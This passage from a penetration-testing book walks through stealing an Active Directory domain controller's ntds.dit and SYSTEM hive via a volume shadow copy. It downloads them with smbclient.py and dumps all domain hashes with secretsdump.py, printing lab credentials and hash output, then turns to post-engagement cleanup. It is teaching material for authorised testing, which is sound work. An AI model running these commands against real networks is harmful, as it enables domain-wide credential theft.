Figure 10.2
Accessing protected domain controller files using a Volume Shadow Copy
186
CHAPTER 10
Controlling the entire network
I’ll use the cme command to access the domain controller with the domain admin cre-
dentials I have and issue the Windows command vssadmin list shadows to see if
there are any existing VSCs on this host:
cme smb 10.0.10.200 -u serveradmin -p 'S3cr3tPa$$!' -x 'vssadmin list
➥ shadows'
In this case, you can see from the output in the next listing that there are no VSCs on this
domain controller. You will have to create one of your own to obtain a copy of ntds.dit. 
[*] Windows 10.0 Build 17763 (name:GOKU) (domain:CAPSULECORP)
[+] CAPSULECORP\serveradmin:S3cr3tPa$$! (Pwn3d!)
[+] Executed command 
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.
No items found that satisfy the query.  
You can create a fresh VSC using the vssadmin command. For the remainder of this
chapter, I assume that you are using cme to interact with the domain controller just as
I did for the command that produced the output in listing 10.8. Rather than spell out
the cme command, I’ll provide you only with the Windows command that you need to
pass to the -x parameter of the cme command on your attacking machine. I’m doing this
to save space and keep everything on one line whenever possible. Here is the command
to create a new VSC of the C: drive on the Capsulecorp Pentest domain controller:
vssadmin create shadow /for=C:
Probably the first thing you’ll notice from the output in listing 10.9 is the strange vol-
ume name, which starts with \\?\. This weird file path can be accessed like any other file
path, by replacing the drive letter with the name of the newly created VSC. To be explic-
itly clear, to access the VSC’s ntds.dit file, which is generally located at c:\windows\
ntds\ntds.dit, you target the following path:
\\?\globalroot\device\harddiskvolumeshadowcopy1\windows\ntds\ntds.dit
[*] Windows 10.0 Build 17763 (name:GOKU) (domain:CAPSULECORP)
[+] CAPSULECORP\serveradmin:S3cr3tPa$$! (Pwn3d!)
[+] Executed command 
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.
deal
Successfully created shadow copy for 'C:\'
Shadow Copy ID: {0fb03856-d017-4768-b00c-5e7b37a6cfd5}
Volume Name:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 
Listing 10.8
Checking for an existing VSC
Listing 10.9
Creating a new VSC
This host has no VSCs.
Physical path on
the machine for
accessing the VSC
187
ntds.dit and the keys to the kingdom
As you can see, everything after the shadowcopy1\ part is the same as if you were tar-
geting files from the C drive. Essentially, you now have a shadow copy of the entire
C: drive that’s accessible freely and without access restrictions. Let’s take advantage of
this and grab an unprotected copy of the ntds.dit file and place it on the root of the
C: drive where you can access it without having to keep typing such a long file path:
copy \\?\globalroot\device\harddiskvolumeshadowcopy1\windows\ntds\ntds.dit
c:\ntds.dit
Recall from section 6.2.1 that to extract local account password hashes from the SAM
registry hive, you also need to obtain two secret keys from the system registry hive,
which are necessary to decrypt the encrypted hashed values. This is also true for the
Active Directory password hashes stored in ntds.dit. You’ll have to grab the system reg-
istry hive from the domain controller. You could use the reg.exe command, or you
could copy the file directly from the VSC because the filesystem is unprotected. I pre-
fer to go that route:
copy
➥ \\?\globalroot\device\harddiskvolumeshadowcopy1\windows\system32\config
\SYSTEM c:\sys
Next, download these two files from the domain controller onto your attacking
machine. This is a great opportunity to introduce a tool called smbclient.py, which is
part of the Impacket Python framework. The smbclient.py command gives you a fully
interactive text-based filesystem browser on the domain controller, provided you give it
a valid username and password. The syntax seems a bit odd the first couple of times you
use it. You need to specify in single quotes the domain followed by a forward slash (/),
then the username followed by a colon (:), and then the password for that account.
Then provide the @[IP Address] for the target server you want to connect to:
smbclient.py 'CAPSULECORP/serveradmin:S3cr3tPa$$!'@10.0.10.200
Once you are connected with smbclient.py, type use C$ to access the local filesystem
share. Type ls at the prompt to see the contents of the root directory, including your
ntds.dit and sys copies. Download them both with the get command, and then type
exit to close the smbclient.py connection.
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
Type help for list of commands
# use C$   
# ls.    
drw-rw-rw-          0  Mon Apr 15 09:57:25 2019 $Recycle.Bin
drw-rw-rw-          0  Wed Jan 30 19:48:51 2019 Documents and Settings
Listing 10.10
Downloading files with smbclient
Activates the Windows C$ share
Lists the contents of the root directory
188
CHAPTER 10
Controlling the entire network
-rw-rw-rw-   37748736  Thu Apr  9 10:19:41 2020 ntds.dit    
-rw-rw-rw-  402653184  Mon Apr 13 08:48:41 2020 pagefile.sys
drw-rw-rw-          0  Wed Jan 30 19:47:05 2019 PerfLogs
drw-rw-rw-          0  Wed Jan 30 16:54:15 2019 Program Files
drw-rw-rw-          0  Wed Jan 30 19:47:05 2019 Program Files (x86)
drw-rw-rw-          0  Thu Jul 11 14:14:10 2019 ProgramData
drw-rw-rw-          0  Wed Jan 30 19:48:53 2019 Recovery
-rw-rw-rw-   16515072  Thu Jan 31 14:54:41 2019 sys    
drw-rw-rw-          0  Thu Apr  9 10:30:52 2020 System Volume Information
drw-rw-rw-          0  Mon Apr 13 08:58:01 2020 Users
drw-rw-rw-          0  Thu Jan 31 15:57:30 2019 Windows
# get ntds.dit    
# get sys    
# exit    
In the next chapter, I cover several things you need to know about cleanup activities
from a post-engagement perspective. I won’t replicate that content here, but if you’re
thinking about deleting the VSC and the ntds.dit and sys files from the C: drive, you
are absolutely correct: you should do that on every engagement. 
 Let’s continue and cover the final piece of this puzzle: extracting the user account
and password hashes from the ntds.dit file. You’ll find a number of different tools and
techniques for this task if you search the internet. We’ve already been using the
Impacket framework, so it makes sense to use another tool that comes with it:
secretsdump.py, which happens to be excellent and works reliably.
10.3.2 Extracting all the hashes with secretsdump.py
The secretsdump.py command takes a couple of arguments. You need to point it to
the system registry hive and the ntds.dit file using the -system and -ntds parameters.
I also like to specify an optional parameter, -just-dc-ntlm, which suppresses a lot of
unnecessary output that secretsdump.py generates if you run it by default:
secretsdump.py -system sys -ntds ntds.dit -just-dc-ntlm LOCAL
Listing 10.11 shows the output from the Capsulecorp Pentest network, which contains
all the password hashes for the entire domain. On a production pentest against a real
enterprise environment, this file would likely contain tens of thousands of password
hashes and probably take a while to complete.
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
[*] Target system bootKey: 0x93f61c9d6dbff31b37ab1a4de9d57e89
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a3a4f36e6ea7efc319cdb4ebf74650fc
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c078c5c86e3499cc    
Listing 10.11
Extracting password hashes with secretsdump.py
The copy 
you made 
of ntds.dit
The copy 
you made of 
the system 
registry hive
Downloads the ntds.dit copy
Downloads the system registry hive copy
Exits the smbclient session
Another set of
domain admin
credentials
189
ntds.dit and the keys to the kingdom
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e
GOKU$:1000:aad3b435b51404eeaad3b435b51404ee:19dd50c1959a860d13953ad0
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f10fa2ce8a7e767248582f79
GOHAN$:1103:aad3b435b51404eeaad3b435b51404ee:e6746adcbeed3a540645b5f
serveradmin:1104:aad3b435b51404eeaad3b435b51404ee:7d51bc56dbc048264f
VEGETA$:1105:aad3b435b51404eeaad3b435b51404ee:53ac687a43915edd39ae4b
TRUNKS$:1106:aad3b435b51404eeaad3b435b51404ee:35b5c455f48b9ec94f579c
trunksadm:1107:aad3b435b51404eeaad3b435b51404ee:f1b2707c0b4aacf4d45f
gohanadm:1108:aad3b435b51404eeaad3b435b51404ee:e690d2dd639d6fa868dee    
vegetaadm:1109:aad3b435b51404eeaad3b435b51404ee:ad32664be269e22b0445
capsulecorp.local\gokuadm:1110:aad3b435b51404eeaad3b435b51404ee:8902
PICCOLO$:1111:aad3b435b51404eeaad3b435b51404ee:33ad82018130db8336f19
piccoloadm:1112:aad3b435b51404eeaad3b435b51404ee:57376301f77b434ac2a
YAMCHA$:1113:aad3b435b51404eeaad3b435b51404ee:e30cf89d307231adbf12c2
krillin:1114:aad3b435b51404eeaad3b435b51404ee:36c9ad3e120392e832f728
yamcha:1115:aad3b435b51404eeaad3b435b51404ee:a1d54617d9793266ccb01f3
KRILLIN$:1116:aad3b435b51404eeaad3b435b51404ee:b4e4f23ac3fe0d88e906d
RADITZ$:1117:aad3b435b51404eeaad3b435b51404ee:f215b8055f7e0219b184b5
raditzadm:1118:aad3b435b51404eeaad3b435b51404ee:af7406245b3fd62af4a8
TIEN$:1119:aad3b435b51404eeaad3b435b51404ee:ee9b39e59c0648efc9528cb6
capsulecorp.local\SM_4374f28b6ff94afab:1136:aad3b435b51404eeaad3b435
capsulecorp.local\SM_8a3389aec10b4ad78:1137:aad3b435b51404eeaad3b435
capsulecorp.local\SM_ac917b343350481e9:1138:aad3b435b51404eeaad3b435
capsulecorp.local\SM_946b21b0718f40bda:1139:aad3b435b51404eeaad3b435
capsulecorp.local\vegetaadm1:1141:aad3b435b51404eeaad3b435b51404ee:1
tien:1142:aad3b435b51404eeaad3b435b51404ee:c5c1157726cde560e1b8e65f3
[*] Cleaning up...
At this point, if you were an actual bad guy/gal, it would be game over for your target
company. You have all the password hashes for all of the Active Directory users, includ-
ing the domain admins. With these credentials, you could move freely and silently
throughout the network environment, rarely having to use the same set of credentials
twice. The only way the organization could lock you out, assuming they discovered you
in the first place, would be to force a password reset across every user in the company. 
 This concludes the third phase of your INPT. The next and last phase of the
engagement is to document your findings in a manner that is both informative and
useful for your client. Ultimately, the reason they pay you to penetrate their enterprise
network is so you can tell them how to improve their security posture. This is an area
where many pentesters struggle. In the next two chapters, you learn how to transform
the information you’ve obtained during the technical portion of your engagement
into an actionable report. You also learn the eight components that a successful
pentest report must contain to help clients improve their security posture and
strengthen the business’s overall resiliency to cyber-attacks.
190
CHAPTER 10
Controlling the entire network
Summary
 The net command can be used to query Active Directory groups and identify
domain admin users.
 The qwinsta command can be used to display currently logged-in users.
 The psexec_command Metasploit module can run the qwinsta command on all
your level-one and level-two hosts, quickly locating systems with domain admin
users logged in.
 Incognito and Mimikatz can be used to harvest credentials and authentication
tokens that allow you to impersonate a domain admin account and access the
domain controller.
 The ntds.dit file is an extensible storage engine database that contains the pass-
word hashes for all Active Directory user accounts.
 You can access the ntds.dit and system registry hive files from a volume shadow
copy (VSC). 
 The secretsdump.py command from the Impacket python framework can
extract the password hashes from ntds.dit.
Exercise 10.1: Stealing passwords from ntds.dit
Access the domain controller goku.capsulecorp.local using the credentials you
obtained from your level-2 host, raditz.capsulecorp.local. 
Create a volume shadow copy (VSC) using the vssadmin command, and steal a copy
of the ntds.dit and the SYSTEM registry hive file from the VSC.
Download the ntds.dit and registry hive copy to your attacking machine, and use
secretsdump.py to extract all the password hashes from ntds.dit. How many pass-
word hashes are there?
The answer is in appendix E.
Phase 4
Documentation
Your engagement is nearing the finish line, but you aren’t done just yet. After
concluding your technical testing, you have to put your findings, observations,
and recommendations into a concise and actionable report for your client or
engagement stakeholders. 
 This part of the book focuses on two main objectives, which you complete at
the end of a penetration test. First is the cleanup exercise, which is not about
erasing your tracks. Remember, this book focuses on a typical internal network
penetration test (INPT), which usually is not stealthy in nature. Rather, cleaning
up means being a professional and removing unnecessary artifacts such as left-
over files, backdoors, and configuration changes from your attack phases. Chap-
ter 11 walks you through the Capsulecorp Pentest environment cleanup
activities and prepares you for the types of things you should expect to do at the
end of every engagement.
 In Chapter 12, you learn about the eight components that make up a solid
pentest deliverable. You’ll understand what questions each section of a pentest
report aims to answer, what to write there, and how best to communicate your
messaging. You even get to see a completed pentest report for the Capsulecorp
Pentest environment. This report includes all eight components introduced in
Chapter 12. 
193
Post-engagement cleanup
You’ve completed the first three phases of your internal network penetration test
(INPT)! Before moving on to the writing your deliverable, I want to cover some
post-engagement cleanup etiquette. You’ve spent the last week or two bombarding
your client’s network with attacks and compromising countless systems on their
domain. This was not a stealthy red team engagement, so you’ve no doubt left lots
of traces in your wake—traces such as user accounts, backdoors, binary files, and
changes to system configurations. Leaving the network in this state may or may not
be in breach of your contract with your client (that’s probably a topic for another
book). But it would definitely be considered unprofessional (maybe even a bit
immature) and would leave your client with a less than pleasant feeling about the
pentest if they discovered the files you carelessly left behind while you were attack-
ing their network. 
This chapter covers
 Killing active shell connections
 Removing unnecessary user accounts
 Deleting miscellaneous files
 Reversing configuration changes
 Closing backdoors
194
CHAPTER 11
Post-engagement cleanup
 I understand how exciting it can be to play the role of an attacker. Chasing domain
admins and moving from system to system trying to escalate your network access to
the top can get the best of you. It isn’t always easy to stop and take proper notes when
you just accessed a system that might contain credentials that will let you access
another system that finally presents you with the keys to the kingdom. In this chapter,
I want to go over a sort of checklist that I use to make sure I’m doing my clients a good
service and cleaning up after myself. I’ve classified all remnants of a pentest into the
following five categories:
 Active shell connections
 User accounts
 Miscellaneous files
 Configuration changes
 Backdoors
I introduced one or more instances of all five categories to compromised systems
throughout the Capsulecorp pentest. While I’m working through a pentest, as soon as
I’ve physically touched a machine (or rather, physically touched the keyboard to issue
a command to a machine), I ask myself whether I have added one of these things to
the target. If yes, I record it in my engagement notes. I’ve done that for the Capsule-
corp pentest so I can walk through the five categories and clean up all of my activities.
When you are finished with an INPT, the environment should be more or less in the
same state that it was before you began the engagement. 
On the risks associated with pentesting
Throughout this chapter, we talk a lot about removing something that was created
during an engagement so the client is not left in a vulnerable state. Someone might
ask, “Why are you putting your client in a vulnerable state to begin with?” I can see
why someone new to the concept of pentesting would wonder this. The reality is this:
the client was likely already in a vulnerable state, as you were able to demonstrate
by compromising them. Ideally, after your engagement is complete, if you’ve done
your job and the client does theirs in terms of implementing the remediation
recommendations you provide, they will be significantly more secure as a result of
your efforts. I—and all the professional pentesters I’ve met—agree that the long-term
benefit outweighs the very short-term risk. Usually we’re talking only a week or two
for most engagements.
That said, if you cannot accept this idea (and some cannot), there is always the
approach of limiting your engagement scope to exclude all penetration of any kind.
For example, in chapter 4, when we discovered default credentials, missing OS
patches, and insecure system configuration settings, the engagement would have
concluded at that point. We would turn in our preliminary results and move on without
further penetration.
195
Deactivating local user accounts
11.1
Killing active shell connections
During the Capsulecorp pentest, you opened a Meterpreter shell connection to two
compromised systems. The first was in section 7.3, when you exploited an unpatched
Windows system. The second was in section 10.2, when you accessed a level-two system
that was identified as having a domain admin user logged in. To kill all active Meter-
preter sessions, you use the sessions -K command—notice the uppercase K—from
your msfconsole. Then, to verify that the sessions were killed, run the sessions -l
command. The resulting output depicts an msfconsole with no active shell connec-
tions, as follows:
Active sessions
===============
No active sessions.   
msf5 >
If for some reason sessions -K fails to kill any of your sessions, hard exit your msfcon-
sole with the exit -y command. If you set up a persistent Meterpreter shell that calls
back to your attacking machine, don’t worry; we’ll cover how to take care of these in
section 11.5.3. For now, you can simply terminate any active listeners you have up with
the jobs -k command in your msfconsole. 
11.2
Deactivating local user accounts
While conducting a pentest, you may find yourself creating a local user account to
compromise a target further. These accounts could expose your client to unnecessary
risk if left enabled. All user accounts that you create during your engagement need to
be removed before you finish your testing. 
 In the case of the Capsulecorp pentest, you didn’t technically create any user
accounts, but you did overwrite the /etc/passwd file of a Linux server with an entry
for a root user account that you could control. I suppose you could make the argu-
ment that this is more of a backdoor than a new user account, but I include it in this